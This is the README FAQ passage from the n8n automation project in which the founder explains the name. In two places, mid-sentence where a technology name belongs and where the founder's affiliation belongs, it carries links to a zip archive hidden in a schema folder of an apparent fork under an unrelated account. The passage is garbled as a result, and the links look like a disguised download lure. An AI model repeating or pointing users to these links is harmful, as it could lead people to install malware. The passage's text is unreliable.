## What does n8n mean?

**Short answer:** It means "nodemation" and is pronounced as n-eight-n.

**Long answer:** "I get that question quite often (more often than I expected) so I decided it is probably best to answer it here. While looking for a good name for the project with a free domain I realized very quickly that all the good ones I could think of were already taken. So, in the end, I chose nodemation. 'node-' in the sense that it uses a Node-View and that it uses https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip and '-mation' for 'automation' which is what the project is supposed to help with. However, I did not like how long the name was and I could not imagine writing something that long every time in the CLI. That is when I then ended up on 'n8n'." - **Jan Oberhauser, Founder and CEO, https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip**
